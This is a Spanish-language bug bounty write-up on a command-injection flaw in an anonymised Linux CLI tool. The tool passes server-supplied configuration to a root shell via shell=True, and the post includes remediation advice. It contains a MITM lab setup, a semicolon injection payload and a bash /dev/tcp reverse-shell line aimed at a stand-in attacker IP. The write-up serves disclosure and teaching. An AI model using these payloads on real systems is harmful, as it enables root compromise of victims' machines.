---
title:       "Cuando el servidor escribe tu línea de comandos: de un campo de configuración a root en tu portátil"
summary:     "Una herramienta de consola que se ejecuta con sudo descargaba su configuración del servidor y la pegaba, tal cual, dentro de una llamada a la shell. Un punto y coma en el sitio correcto y el atacante es root. Reporte aceptado y recompensado."
date:        2026-11-11 19:40:00 +0100
lang:        es
ref:         rce-cli-shell-true

severity:    high
cvss:        "8.8"
cvss_vector: "CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
cwe:         "CWE-78 · CWE-88"
vuln_class:  "Inyección"
target_type: "Cliente de escritorio (Linux)"
platform:    "YesWeHack"
status:      "Corregido"
reward:      "Recompensado"
tags:        [rce, linux, shell, mitm, root, inyeccion-de-comandos, python]

takeaways:
  - "`shell=True` convierte una cadena en un programa. Si parte de esa cadena viene de la red, el servidor escribe tu línea de comandos."
  - "«Es que el atacante necesita un MITM» no es una excusa: si el programa lo contempla en su alcance, es una precondición, no una barrera."
  - "Cuando un cliente acepta **opciones** de un servidor, hace falta una lista blanca. Filtrar caracteres raros siempre se queda corto."
  - "El propio mensaje de error del programa me enseñó el comando que había construido. Leer los errores despacio vale más que muchos payloads."
---

Este es el segundo fallo que publico, y es de los que se te quedan grabados: **el servidor
decide, literalmente, qué comando ejecuta tu ordenador como root**. No hace falta
desbordar nada ni entender una arquitectura rara. Hace falta entender una sola decisión de
programación que millones de scripts toman mal todos los días.

<div class="warn" markdown="1">
**Todo está anonimizado.** El programa autorizó la publicación con la condición de no
identificar al producto. He cambiado el fabricante, el tipo de aplicación, los hosts, los
nombres de clases y métodos y los números de versión. **El mecanismo y el fallo son
exactos.**
</div>

## El objetivo, en una frase

Una herramienta de **línea de comandos para Linux** que forma parte de una aplicación de
escritorio. Para funcionar necesita permisos de administrador, así que se ejecuta con
`sudo` — eso está documentado y es lo normal en su caso: tiene que tocar la configuración
de red del sistema.

Cuando le pides que se conecte, hace esto:

1. Pide al servidor del fabricante los parámetros de conexión.
2. Con esos parámetros construye la orden que lanzará un binario del sistema.
3. Ejecuta esa orden.

Tres pasos. El fallo está entero en el salto del 1 al 3.

## La línea que lo cambia todo

Leyendo el código de la herramienta (venía empaquetada, pero se puede extraer) encontré el
punto donde ejecuta la orden:

```python
# libs/helpers.py
def execute_command(cmd):
    proceso = subprocess.Popen(cmd, shell=True)
    ...
```

<div class="plain" markdown="1">
**En cristiano:** `subprocess` es la forma que tiene Python de ejecutar programas. Puede
hacerlo de dos maneras, y la diferencia lo es todo:

- **Sin shell** (`shell=False`): le pasas una lista — *«ejecuta el programa `ping`, con el
  argumento `8.8.8.8`»*. Python se lo entrega al sistema operativo tal cual. Si el
  argumento contiene un punto y coma, es un punto y coma; un carácter más del texto.
- **Con shell** (`shell=True`): le pasas **una frase entera** y Python se la entrega a
  `/bin/sh` para que la interprete. Y la shell sí entiende el punto y coma: significa
  *«aquí acaba un comando y empieza otro»*.

La primera opción trata tus datos como datos. La segunda los trata como **código**.
</div>

Compruébalo tú mismo, que se ve en diez segundos:

```python
import subprocess

objetivo = "8.8.8.8; touch /tmp/me-han-colado"

# forma segura: el punto y coma es solo un carácter del argumento
subprocess.run(["ping", "-c1", objetivo])          # ping falla, no se crea nada

# forma insegura: la shell interpreta el punto y coma
subprocess.run(f"ping -c1 {objetivo}", shell=True) # el fichero aparece
```

## ¿Y qué metía dentro de esa cadena?

La pregunta de siempre: **¿de dónde salen los trozos del comando?** Seguí la construcción
hacia atrás:

```python
# el cliente se descarga un bloque de texto con la configuración
respuesta = requests.get(f"https://api.ejemplo.tld/v2/my/servers/{server_id}/configs")
bloque    = respuesta.json()["clientdata"]

# lo parte por líneas y por espacios, sin filtrar nada
parametros = parse_config(bloque)

# y lo pega dentro de la orden final
cmd = "sudo {} {} {}".format(binario, " ".join(parametros), filtros)
execute_command(cmd)      # <- shell=True
```

<div class="plain" markdown="1">
**En cristiano:** el programa le pide al servidor «dime cómo conectarme». El servidor
responde con un texto. El programa parte ese texto en trozos y los **pega dentro de la
frase** que va a ejecutar como root. No comprueba qué opciones son válidas, ni si los
valores contienen caracteres peligrosos. Lo que el servidor diga, se ejecuta.
</div>

Dicho de otra forma: **el servidor tiene permiso de escritura sobre tu línea de comandos**.

## «Pero para eso hay que ser el servidor»

Exacto, y aquí es donde mucha gente abandona. Yo también estuve a punto.

Para que esto se dispare, el atacante tiene que responder a esa petición HTTPS: tiene que
estar **en medio** de la conexión. A eso se le llama *man in the middle* (MITM), y suena a
condición imposible.

No lo es tanto:

- Una wifi pública con un certificado raíz preinstalado (hoteles, aeropuertos, cafeterías
  con portal cautivo).
- Un ordenador de empresa con un certificado corporativo instalado para inspeccionar el
  tráfico. Eso es normalísimo y existe en casi todas las empresas grandes.
- Una autoridad de certificación intermedia comprometida — ha pasado varias veces.
- Un insider con acceso al proveedor de red.

Y lo decisivo: **el propio programa de bug bounty lo incluía expresamente en su alcance**,
en la categoría *«ejecución de código arbitrario mediante ataques MITM»*. Si el programa lo
contempla, no es una excusa para no reportar: es una **precondición declarada**.

<div class="note" markdown="1">
Esto es importante para quien empieza. Antes de descartar un fallo por «necesita una
condición rara», **lee el alcance del programa**. Muchos listan explícitamente qué
precondiciones aceptan. Si tu precondición está en esa lista, tu hallazgo cuenta.
</div>

Y lo que convierte la precondición en fallo del producto: el cliente **no comprobaba qué
certificado** estaba aceptando más allá de la validación normal del sistema. Otra parte
del mismo producto sí lo hacía — tenía fijado el certificado esperado — pero esta no. Esa
incoherencia fue media mitad del reporte.

## Montar el laboratorio

Todo en una máquina virtual desechable, haciendo los dos papeles: atacante y víctima.

```bash
# 1 · crear una autoridad de certificación propia y confiarla en el sistema
openssl req -x509 -newkey rsa:4096 -nodes -days 1 \
        -keyout ca.key -out ca.crt -subj "/CN=LAB-CA"
sudo cp ca.crt /usr/local/share/ca-certificates/lab.crt && sudo update-ca-certificates

# 2 · emitir un certificado para el dominio del fabricante, firmado por mi CA
#     (en un ataque real esto lo da la wifi, el proxy corporativo o la CA comprometida)

# 3 · hacer que el dominio apunte a mi propia máquina
echo "127.0.0.1  api.ejemplo.tld" | sudo tee -a /etc/hosts

# 4 · levantar un proxy que reenvía TODO al servidor real...
#     ...menos la petición de configuración, que la contesto yo
```

<div class="plain" markdown="1">
**En cristiano:** monto un servidor falso que se hace pasar por el del fabricante. Casi
todo lo reenvío al servidor de verdad para que la aplicación no note nada raro: el login
funciona, la lista de servidores funciona, todo normal. **Solo intercepto una petición**:
la que trae la configuración. Esa la contesto yo.
</div>

{% comment %} PENDIENTE DE CAPTURA — quita esta linea y la de cierre cuando exista el fichero
<figure>
  <img src="{{ '/assets/img/writeups/rce-cli-shell-true/01-setup-atacante.png' | relative_url }}"
       alt="Terminal del atacante: CA propia instalada en el almacén del sistema, dominio redirigido en /etc/hosts y proxy escuchando en el puerto 443">
  <figcaption>El montaje del atacante: CA propia confiada, dominio redirigido y proxy escuchando.</figcaption>
</figure>
{% endcomment %}

## El payload

El servidor falso devuelve la configuración con una línea envenenada:

```
cipher aes-256-gcm; id > /tmp/pwn; touch /tmp/marcador; #
```

Tres piezas, y cada una hace un trabajo:

| Pieza | Para qué sirve |
|---|---|
| `cipher aes-256-gcm` | Parece una opción de configuración legítima. Si alguien mira por encima, no ve nada raro |
| `; id > /tmp/pwn; touch /tmp/marcador` | Los **puntos y coma** cierran el comando anterior y abren los míos |
| `#` | Comenta todo lo que el programa añada después, para que no estorbe |

<div class="plain" markdown="1">
**En cristiano:** el programa iba a ejecutar `sudo binario --opciones...`. Mi texto se
cuela en el medio, el punto y coma corta ahí la frase, mis comandos se ejecutan, y la
almohadilla hace que la shell ignore el resto. Es exactamente lo mismo que una inyección
SQL, pero la base de datos es tu sistema operativo.
</div>

## El disparo

La víctima escribe el comando normal y documentado del producto. Uno. El que escribiría
cualquier día.

Y aquí pasó algo que no esperaba y que mejoró el reporte: **el programa falló y, al
fallar, imprimió el comando que había construido**.

{% comment %} PENDIENTE DE CAPTURA — quita esta linea y la de cierre cuando exista el fichero
<figure>
  <img src="{{ '/assets/img/writeups/rce-cli-shell-true/02-victima-rce.png' | relative_url }}"
       alt="Terminal de la víctima: el comando documentado se ejecuta y el mensaje de error muestra la línea completa con el payload inyectado">
  <figcaption>El mensaje de error enseña la cadena exacta que la shell acababa de interpretar. El propio programa delata el fallo.</figcaption>
</figure>
{% endcomment %}

<div class="plain" markdown="1">
**En cristiano:** el binario del sistema murió porque la almohadilla le dejó la orden a
medias. Al morir, el programa mostró un error con la frase completa que había intentado
ejecutar — **con mi payload dentro, a la vista**. El fallo del programa es la prueba del
fallo del programa. Esto es oro para un reporte: no tienes que convencer a nadie de lo que
pasó, lo enseña la propia herramienta.
</div>

Y lo importante: los comandos **ya se habían ejecutado** antes de que el binario muriera.
La shell interpreta la lista de izquierda a derecha.

{% comment %} PENDIENTE DE CAPTURA — quita esta linea y la de cierre cuando exista el fichero
<figure>
  <img src="{{ '/assets/img/writeups/rce-cli-shell-true/03-verificacion-root.png' | relative_url }}"
       alt="Los ficheros marcador existen, pertenecen a root y el contenido muestra uid=0(root), mientras el usuario que lanzó el comando sigue siendo el usuario normal">
  <figcaption>Los marcadores existen y son de <code>root</code>. Quien lanzó el comando era un usuario normal.</figcaption>
</figure>
{% endcomment %}

Esa es la prueba que vale: **el fichero lo creó `uid=0`**, no el usuario. Y no se levantó
ninguna conexión, así que el usuario solo vio un error de conexión y volvió a intentarlo —
disparando el payload otra vez.

## Segunda parte: de «ejecuto comandos» a «estoy dentro»

Un marcador en `/tmp` demuestra el mecanismo, pero a un responsable de seguridad no le
dice *cuánto* duele. Así que cambié el payload por una **shell inversa**:

```
cipher aes-256-gcm; bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1' & id > /tmp/pwn; #
```

<div class="plain" markdown="1">
**En cristiano:** en lugar de crear un fichero, le digo al ordenador de la víctima que
abra una conexión **hacia mí** y me entregue una consola. A partir de ahí escribo en mi
terminal y los comandos se ejecutan en su máquina, como root. No es una metáfora: es su
ordenador, en mi pantalla.
</div>

{% comment %} PENDIENTE DE CAPTURA — quita esta linea y la de cierre cuando exista el fichero
<figure>
  <img src="{{ '/assets/img/writeups/rce-cli-shell-true/04-shell-inversa.png' | relative_url }}"
       alt="Terminal del atacante con una sesión interactiva: id devuelve uid=0(root), whoami devuelve root, y se listan ficheros del directorio /root de la víctima">
  <figcaption>Sesión interactiva como <code>root</code> en la máquina de la víctima. El <code>id</code> y el <code>whoami</code> no dejan lugar a dudas.</figcaption>
</figure>
{% endcomment %}

Demostrar el salto de «ejecuto un comando» a «tengo una sesión» es lo que convierte un
*Medium* en un *High*. Mismo fallo, impacto muy distinto a ojos de quien lo tría.

## El control negativo

Repetí **exactamente lo mismo** cambiando una sola cosa: el payload por una línea de
configuración limpia.

```
cipher aes-256-gcm
```

Resultado: ningún fichero marcador, ninguna conexión, ninguna ejecución. La aplicación se
conecta con normalidad.

<div class="plain" markdown="1">
**En cristiano:** si quito los dos puntos y coma y dejo la configuración normal, no pasa
absolutamente nada. Eso prueba que el fallo son esos caracteres pasando sin filtrar hasta
la shell, y no cualquier otra cosa del montaje — ni mi CA falsa, ni el proxy, ni la
máquina virtual.
</div>

## Impacto

<div class="impact" markdown="1">
**Impacto.** Ejecución de comandos como **root** en cualquier máquina Linux con el cliente
instalado, con la víctima haciendo exactamente una acción: el comando que el propio
producto documenta. El código del atacante corre **antes** de que se establezca la
conexión, así que puede instalar persistencia (`authorized_keys`, una tarea programada, un
servicio del sistema) en milisegundos. Cambiar la contraseña de la cuenta no sirve de
nada: el atacante ya no está en la cuenta, está en la máquina. La única limpieza fiable es
reinstalar el sistema operativo, y la víctima no tiene ningún motivo para sospecharlo.
</div>

## El arreglo

Tres medidas, y hacen falta las tres:

**1. No construyas comandos como texto.** Pasa una lista de argumentos:

```python
subprocess.run([binario, "--opcion", valor], shell=False)
```

Así un punto y coma dentro de `valor` es un punto y coma, no un separador. Esto por sí
solo mata el ataque.

**2. Lista blanca de opciones.** El cliente debe aceptar del servidor **solo** las opciones
que necesita, y rechazar cualquier otra línea. Es especialmente grave con herramientas que
admiten opciones capaces de ejecutar programas: si el servidor puede mandar una de esas,
no hace falta ni inyectar nada.

<div class="plain" markdown="1">
**En cristiano:** no basta con filtrar caracteres raros. Hay opciones de configuración que
**por diseño** ejecutan programas. Si aceptas cualquier opción que te mande el servidor,
el atacante no necesita trucos: te manda la opción legítima que ejecuta su programa. Por
eso la lista blanca va primero y el filtrado después.
</div>

**3. Fijar el certificado** del servidor en todas las conexiones, no solo en algunas. Así
una CA ajena —aunque el sistema la considere válida— no basta para suplantar al servidor.

## Cómo buscar esto tú mismo

En cualquier código Python que caiga en tus manos:

```bash
grep -rnE 'shell\s*=\s*True|os\.system|os\.popen' .
```

Y por cada resultado, las dos preguntas:

1. **¿Alguna parte de esa cadena viene de fuera?** De la red, de un fichero, de una
   variable de entorno, de un argumento.
2. **¿Quién controla ese «fuera»?** Si la respuesta incluye «un servidor al que puedo
   responder yo», ya lo tienes.

El equivalente en otros lenguajes: `exec`/`system`/`passthru` en PHP, `child_process.exec`
en Node (frente a `execFile`), `Runtime.exec(String)` en Java, backticks en Ruby y Perl.
El patrón es idéntico en todos: **una cadena que acaba en un intérprete**.

<div class="note" markdown="1">
**Hazlo solo donde tengas permiso.** Montar un MITM contra ti mismo en una máquina virtual
tuya es un laboratorio. Hacerlo contra el tráfico de otra persona es un delito, y además no
hace falta: para demostrar el fallo basta con tu propia máquina y tu propia cuenta.
</div>
